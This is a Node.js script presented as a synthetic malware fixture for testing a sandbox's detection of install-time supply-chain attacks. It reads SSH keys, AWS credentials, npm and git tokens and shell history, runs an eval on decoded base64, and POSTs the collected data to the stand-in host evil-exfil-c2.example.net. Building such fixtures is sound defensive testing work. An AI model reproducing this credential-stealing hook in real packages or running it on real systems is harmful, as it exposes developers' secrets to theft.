/*
 * SYNTHETIC MALWARE FIXTURE — Claude Rabbit sandbox proof. NOT real malware,
 * NOT to be published. It emulates the dominant install-time supply-chain
 * attack: on `npm install`, a postinstall hook reads credential files and
 * attempts to exfiltrate them to an external host. In the hermetic sandbox the
 * outbound attempt is BLOCKED by the egress lockdown and the credential reads
 * are OBSERVED — which is the whole point of the proof.
 *
 * This is a CommonJS Node script that runs INSIDE the sandbox (not part of the
 * Next.js module graph). `require`, `eval`, and empty catches are deliberate
 * traits of the emulated payload, so app-code lint rules do not apply here.
 */
/* eslint-disable @typescript-eslint/no-require-imports, @typescript-eslint/no-unused-vars */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// 1) Read credential-bearing paths (the sandbox plants decoy canaries here).
const home = os.homedir();
const targets = [
  path.join(home, '.ssh', 'id_rsa'),
  path.join(home, '.ssh', 'id_ed25519'),
  path.join(home, '.aws', 'credentials'),
  path.join(home, '.npmrc'),
  path.join(home, '.git-credentials'),
  path.join(home, '.bash_history'),
];
let loot = '';
for (const t of targets) {
  try {
    loot += `\n### ${t}\n` + fs.readFileSync(t, 'utf8');
    console.log('[postinstall] read', t);
  } catch (e) {
    // file may not exist; keep going
  }
}

// 2) Obfuscated payload: eval(atob(...)) — a classic obfuscation tell. Decodes
//    to a benign marker here, but the PATTERN is what static + dynamic flag.
//    (base64 of: console.log('[obf] decoded payload executed'); )
const b64 = "Y29uc29sZS5sb2coJ1tvYmZdIGRlY29kZWQgcGF5bG9hZCBleGVjdXRlZCcpOw==";
try {
  // eslint-disable-next-line no-eval
  eval(Buffer.from(b64, 'base64').toString('utf8'));
} catch (e) {}

// 3) Attempt exfiltration to an external host. The egress lockdown BLOCKS this;
//    the blocked outbound attempt is the detection signal.
const payload = Buffer.from(loot || 'no-loot').toString('base64');
const req = https.request(
  {
    hostname: 'evil-exfil-c2.example.net',
    port: 443,
    path: '/collect',
    method: 'POST',
    timeout: 5000,
    headers: { 'Content-Type': 'application/octet-stream' },
  },
  (res) => {
    console.log('[postinstall] exfil response status', res.statusCode);
  }
);
req.on('error', (e) => {
  console.log('[postinstall] exfil attempt failed (expected in sandbox):', e.code || e.message);
});
req.on('timeout', () => { req.destroy(); });
req.write(payload);
req.end();
